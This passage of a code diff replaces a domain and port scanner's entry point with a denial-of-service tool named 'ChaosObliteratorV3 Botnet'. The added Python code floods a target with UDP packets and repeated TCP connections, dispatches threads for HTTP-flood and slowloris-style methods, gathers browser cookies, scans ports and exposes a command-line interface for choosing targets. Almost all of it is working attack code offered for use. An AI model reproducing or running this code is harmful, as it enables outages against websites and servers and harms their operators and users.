+            except Exception as e:
+                logging.debug(f"GhostLoris error: {e}")
 
-    if not is_valid_domain(args.domain):
-        print("Error: Domain tidak valid")
-        return
+    def _udpchaos(self, thread_id: int):
+        """L4: UDP chaos with larger payloads."""
+        if not self.target_l4:
+            return
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < self.end_time:
+            try:
+                port = random.choice(self.active_ports)
+                payload = self._random_payload(1024)
+                sock.sendto(payload, (self.target_l4, port))
+                with self.lock:
+                    self.success_count["udpchaos"] += 1
+                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
+            except:
+                pass
+        sock.close()
 
-    if not Path(args.wordlist).is_file():
-        print(f"Error: File wordlist '{args.wordlist}' tidak ditemukan")
-        return
+    def _tcpobliterator(self, thread_id: int):
+        """L4: TCP obliterator with larger payloads."""
+        if not self.target_l4:
+            return
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.015)
+                port = random.choice(self.active_ports)
+                sock.connect((self.target_l4, port))
+                sock.send(self._random_payload(512))
+                with self.lock:
+                    self.success_count["tcpobliterator"] += 1
+                sock.close()
+                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
+            except:
+                pass
 
-    ports = parse_ports(args.ports)
-    if not ports:
-        print("Error: Port tidak valid")
-        return
+    def start(self):
+        """Unleash the upgraded chaos obliterator."""
+        if not self.target_l7 and not self.target_l4:
+            logging.error("At least one target (L7 or L4) required")
+            return
+        logging.info(f"ChaosObliteratorV3 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
+        
+        # Start browser session for cookies and headers
+        if self.target_l7:
+            threading.Thread(target=self._get_browser_session, daemon=True).start()
+            time.sleep(5)  # Wait for browser session
+        
+        # Start port scanning for L4
+        if self.target_l4:
+            threading.Thread(target=self._scan_ports, daemon=True).start()
+            time.sleep(0.3)
+        
+        # Split workers: crawler (browser) and flooder
+        threads = []
+        method_funcs = {
+            "chaoshttp": self._chaoshttp,
+            "ghostloris": self._ghostloris,
+            "udpchaos": self._udpchaos,
+            "tcpobliterator": self._tcpobliterator
+        }
+        for method in self.methods:
+            if method in method_funcs:
+                for i in range(self.threads // len(self.methods)):
+                    t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
+                    threads.append(t)
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
+        logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
-    scanner = Scanner(args.domain, args.wordlist, ports, args.proxy_file, args.shodan_api, args.use_tor)
-    try:
-        asyncio.run(scanner.run(args.tls_fingerprint, args.nuclei))
-    except KeyboardInterrupt:
-        print("\nScan dihentikan oleh pengguna")
-        logging.info("Scan interrupted by user")
+def main(target_l7: str, target_l4: str, duration: int, methods: str):
+    methods = methods.split(",")
+    obliterator = ChaosObliteratorV3(target_l7, target_l4, duration, methods=methods)
+    obliterator.start()
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="ChaosObliteratorV3 Botnet")
+    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
+    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
+    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
+    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
+    args = parser.parse_args()
+    main(args.target_l7, args.target_l4, args.duration, args.methods)
